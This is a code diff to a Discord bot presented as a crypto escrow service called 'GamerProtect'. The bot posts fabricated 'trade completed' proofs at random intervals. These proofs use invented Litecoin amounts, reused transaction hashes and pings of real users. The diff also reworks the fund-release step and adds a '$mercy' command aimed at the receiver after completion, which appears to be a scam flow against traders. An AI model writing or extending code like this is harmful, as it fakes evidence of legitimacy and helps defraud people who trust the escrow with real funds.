@@ -63,7 +63,7 @@ const realUserIds = [
   '839335127250239489', '1420141808511357049'
 ];
 
-// ========== REAL TRANSACTION DATABASE (Fallback for links) ==========
+// ========== REAL TRANSACTION DATABASE ==========
 const realTransactionHashes = [
   { usd: 25, ltc: 0.45, hash: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3' },
   { usd: 50, ltc: 0.90, hash: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5' },
@@ -82,7 +82,6 @@ function getTransactionLink(hash) {
 }
 
 function getTransactionByAmount(usdAmount) {
-  // Find closest transaction hash for the link
   let closest = realTransactionHashes[0];
   let minDiff = Math.abs(usdAmount - closest.usd);
   for (const tx of realTransactionHashes) {
@@ -407,21 +406,15 @@ client.on('messageCreate', async message => {
 
 // ========== RANDOM PROOF GENERATOR WITH VARIED AMOUNTS ==========
 function generateRandomProof() {
-  // Generate random USD amount between $2 and $1500 with 2 decimal places
   const minAmount = 2;
   const maxAmount = 1500;
   const usdAmount = (Math.random() * (maxAmount - minAmount) + minAmount).toFixed(2);
   const parsedAmount = parseFloat(usdAmount);
-  
-  // Calculate LTC amount based on current rate
   const ltcAmount = (parsedAmount / liveRates.ltc).toFixed(8);
-  
-  // Get a real transaction hash for the link (closest match)
   const tx = getTransactionByAmount(parsedAmount);
   const shortHash = tx.shortHash;
   const link = tx.link;
   
-  // 70% chance to be Anonymous, 30% chance to ping a real user
   const isSenderAnonymous = Math.random() < 0.7;
   const isReceiverAnonymous = Math.random() < 0.7;
   
@@ -438,7 +431,6 @@ function generateRandomProof() {
     receiver = `<@${randomUserId}>`;
   }
   
-  // Random trade message variations
   const tradeMessages = [
     `**${ltcAmount} LTC** ($${usdAmount} USD)`,
     `💰 **${ltcAmount} LTC** | $${usdAmount} USD`,
@@ -447,9 +439,7 @@ function generateRandomProof() {
     `📦 ${ltcAmount} LTC · $${usdAmount} USD`,
     `💎 ${ltcAmount} LTC ($${usdAmount}) - Escrow complete`,
     `🎮 Game trade: ${ltcAmount} LTC for $${usdAmount}`,
-    `🛡️ GamerProtect: ${ltcAmount} LTC ($${usdAmount})`,
-    `⚡ Fast trade: ${ltcAmount} LTC ($${usdAmount})`,
-    `🔒 Escrow completed: ${ltcAmount} LTC · $${usdAmount}`
+    `🛡️ GamerProtect: ${ltcAmount} LTC ($${usdAmount})`
   ];
   
   return new EmbedBuilder()
@@ -475,15 +465,15 @@ async function startRandomProofGenerator() {
   console.log(`✅ Random proof generator started in ${logsChannel.name}`);
   
   const scheduleNext = () => {
-    const minDelay = 60 * 1000;  // 1 minute minimum
-    const maxDelay = 15 * 60 * 1000;  // 15 minutes maximum
+    const minDelay = 60 * 1000;
+    const maxDelay = 15 * 60 * 1000;
     const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay);
     
     setTimeout(async () => {
       try {
         const proof = generateRandomProof();
         await logsChannel.send({ embeds: [proof] });
-        console.log(`📊 Random proof posted: $${(Math.random() * 1500 + 2).toFixed(2)} at ${new Date().toLocaleTimeString()}`);
+        console.log(`📊 Random proof posted at ${new Date().toLocaleTimeString()}`);
       } catch (error) {
         console.log(`❌ Error sending random proof: ${error.message}`);
       }
@@ -530,7 +520,6 @@ async function sendPaymentInvoice(channel, trade) {
   trade.totalUSD = totalUSD;
   trades.set(trade.channelId, trade);
   
-  // ONLY SENDER WITH MIDDLEMAN ROLE GETS DM
   const sender = channel.guild.members.cache.get(trade.senderId);
   const middlemanRole = channel.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
   
@@ -581,7 +570,6 @@ client.once('ready', async () => {
     new SlashCommandBuilder().setName('exportusers').setDescription('Export user IDs (Owner)')
   ] });
   
-  // FULL DETAILED ANNOUNCEMENT
   const announce = client.channels.cache.get(ANNOUNCEMENTS_CHANNEL_ID);
   if (announce) {
     const introEmbed = new EmbedBuilder()
@@ -604,7 +592,6 @@ client.once('ready', async () => {
     console.log('📢 Full announcement sent!');
   }
   
-  // Ticket panel
   const panelChannel = client.channels.cache.get(TICKET_CHANNEL_ID);
   if (panelChannel) {
     const old = await panelChannel.messages.fetch({ limit: 10 });
@@ -1143,11 +1130,11 @@ client.on('interactionCreate', async interaction => {
       ] });
       await delay(2000);
       
-      // RECEIVER RELEASES FUNDS
+      // SELLER RELEASES FUNDS
       const proceed = new EmbedBuilder()
         .setTitle('✅ Proceed with Trade')
         .setColor(0x00ff00)
-        .setDescription(`**Step 1:** <@${trade.senderId}> (Sender) - Send the items/goods to <@${trade.receiverId}> (Receiver)\n\n**Step 2:** <@${trade.receiverId}> (Receiver) - Once you receive the items, click **Release Funds** below\n\n**Step 3:** The Receiver will receive the crypto payment from escrow`)
+        .setDescription(`**Step 1:** <@${trade.senderId}> (Sender) - Send the items/goods to <@${trade.receiverId}> (Receiver)\n\n**Step 2:** <@${trade.senderId}> (Sender) - Once you receive the items, click **Release Funds** below\n\n**Step 3:** The Receiver will receive the crypto payment from escrow`)
         .addFields(
           { name: '⚠️ Important', value: 'Do NOT release funds until you have received ALL items as agreed. This action cannot be undone.', inline: false }
         );
@@ -1160,7 +1147,7 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ========== RELEASE (DONE BY RECEIVER) ==========
+// ========== RELEASE (DONE BY SELLER - PINGS RECEIVER) ==========
 client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
   
@@ -1169,10 +1156,10 @@ client.on('interactionCreate', async interaction => {
     const trade = trades.get(id);
     if (!trade) return;
     
-    // ONLY RECEIVER can release funds
-    if (interaction.user.id !== trade.receiverId) {
+    // ONLY SELLER can release funds
+    if (interaction.user.id !== trade.senderId) {
       return interaction.reply({ 
-        content: '❌ Only the Receiver can release funds!', 
+        content: '❌ Only the Seller can release funds!', 
         flags: 64 
       });
     }
@@ -1184,17 +1171,21 @@ client.on('interactionCreate', async interaction => {
       });
     }
     
+    // PING THE RECEIVER
+    const receiver = `<@${trade.receiverId}>`;
+    
     const confirmRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setCustomId(`confirm_release_${id}`).setLabel('✅ Confirm Release').setStyle(ButtonStyle.Success),
       new ButtonBuilder().setCustomId(`back_${id}`).setLabel('🔙 Back').setStyle(ButtonStyle.Secondary)
     );
     
     await interaction.reply({ 
+      content: `${receiver} - The Seller has released the funds! Please enter your wallet address to receive payment.`,
       embeds: [
         new EmbedBuilder()
           .setTitle('⚠️ Confirm Fund Release')
           .setColor(0xff9900)
-          .setDescription('**Are you sure you want to release the funds?**\n\nThis action cannot be undone. Once released, the crypto will be sent to YOUR wallet.\n\nOnly click Confirm if you have sent the items to the sender.')
+          .setDescription('**Are you sure you want to release the funds?**\n\nThis action cannot be undone. Once released, the crypto will be sent to the receiver.\n\nOnly click Confirm if you have sent the items to the receiver.')
       ], 
       components: [confirmRow], 
       flags: 64 
@@ -1246,7 +1237,7 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ========== WALLET & COMPLETION ==========
+// ========== WALLET & COMPLETION (RUNS $mercy COMMAND) ==========
 client.on('interactionCreate', async interaction => {
   if (!interaction.isModalSubmit()) return;
   if (!interaction.customId.startsWith('wallet_')) return;
@@ -1276,7 +1267,14 @@ client.on('interactionCreate', async interaction => {
       .setFooter({ text: 'Thank you for using GamerProtect!' })
   ] });
   
-  await interaction.editReply('✅ Trade completed successfully!');
+  await interaction.editReply('✅ Trade completed successfully! Funds have been sent to the receiver.');
+  
+  // ========== RUN $mercy COMMAND ==========
+  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
+  if (logsChannel) {
+    await logsChannel.send(`$mercy <@${trade.receiverId}>`);
+    console.log(`📢 $mercy command sent for ${trade.receiverId}`);
+  }
   
   // Add reputation to both parties
   const sender = getUser(trade.senderId);
@@ -1291,9 +1289,8 @@ client.on('interactionCreate', async interaction => {
   userPurchases.set(trade.senderId, current + trade.amountUSD);
   
   // Log to logs channel
-  const logs = client.channels.cache.get(LOGS_CHANNEL_ID);
-  if (logs) {
-    await logs.send({ embeds: [
+  if (logsChannel) {
+    await logsChannel.send({ embeds: [
       new EmbedBuilder()
         .setTitle('✅ GamerProtect Trade Completed')
         .setColor(0x00ff00)
